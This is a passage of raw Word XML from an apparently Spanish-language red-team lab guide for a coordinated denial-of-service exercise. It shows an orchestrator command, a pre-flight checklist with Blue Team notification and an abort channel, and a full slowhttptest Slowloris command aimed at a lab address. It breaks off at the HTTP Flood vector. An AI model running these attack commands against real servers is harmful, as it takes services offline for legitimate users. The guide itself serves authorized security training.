          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>tiempo_respuesta</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve">. Durante el ataque se verá cómo el tiempo de respuesta aumenta o el código cambia a </w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>000</w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>timeout</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7ECA5351" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Terminal 3 (</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>PowerShell) —</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> Orquestador de vectores</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32EB47EF" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>docker exec -it redteam-kali bash -c "</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="073358E5" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">  LAB_TARGET=172.20.0.20 PAUSE_BETWEEN_VECTORS=30 bash /root/scripts/phase-6-dos/run-dos-window.sh</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57E5FE17" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D519B56" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2EC10A0F" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFF3CD"/>
        <w:spacing w:before="40" w:after="40"/>
        <w:ind w:left="567" w:right="567"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:b/>
          <w:color w:val="856604"/>
          <w:sz w:val="20"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>⚠ **</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:b/>
          <w:color w:val="856604"/>
          <w:sz w:val="20"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Nota:*</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:b/>
          <w:color w:val="856604"/>
          <w:sz w:val="20"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>* `PAUSE_BETWEEN_VECTORS=30` reduce la pausa entre vectores a 30 segundos para la demo. En producción real es 300 segundos (5 minutos) para permitir recuperación completa del servicio.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EABB6CB" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>El script pide confirmación interactiva antes de cada paso:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C905F50" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>============================================</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29A56A8A" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve"> DoS WINDOW — Coordinated attack execution</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49F4E7E1" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>============================================</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="537081F9" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>Pre-flight checklist:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E370221" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">  [ ] Blue Team notificado y monitoreando</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F596934" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>[ ]</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Ventana acordada (hora inicio / hora fin)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6425D917" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>[ ]</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Canal de señal de </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>abort</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> establecido</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B062219" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>[ ]</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> 99-monitor.sh corriendo en segunda terminal</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5556CB48" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7DC17DD1" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Todo confirmado?</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Escribe YES para continuar:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0304B404" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="667A9EF2" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve">Escribir </w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>YES</w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> y presionar Enter.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09308B2D" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Luego para cada vector:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2657FEFD" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Baseline</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> capturado. </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Iniciar Vector 1 (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Slowloris</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>)?</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> [y/N]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18DDE7E2" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="141596E1" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve">Escribir </w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> presionar Enter.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B49FE0C" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="1F3564"/>
        </w:pBdr>
        <w:spacing w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="00A3D0B4" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="1F3564"/>
          <w:sz w:val="24"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Detalles de cada vector</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="278A41AA" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:b/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve">Vector 1 — </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:b/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Slowloris</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="7E05DA0B" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:b/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Qué hace:</w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Abre 500 conexiones HTTP incompletas y las mantiene vivas enviando </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>headers</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> parciales cada 10 segundos. Agota el pool de </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>workers</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> del servidor Apache (150 conexiones máximo por defecto), impidiendo que usuarios legítimos se conecten.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="418AC1AF" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>slowhttptest</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve"> -c 500 -H -i 10 -r 200 -t GET \</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0335252E" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">             </w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>-u http://172.20.0.20:80/ -x 24 -p 3 -l 60 \</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28DFF795" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve">             -g -o </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>slowloris-report</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="3329C681" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="64B11642" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:b/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Duración:</w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> 60 segundos. </w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:b/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Impacto esperado:</w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Apache deja de responder a nuevas conexiones. El monitor mostrará </w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>000</w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>timeout</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>) en los logs.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78AFC22E" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:b/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Vector 2 — HTTP Flood</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09B9679C" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
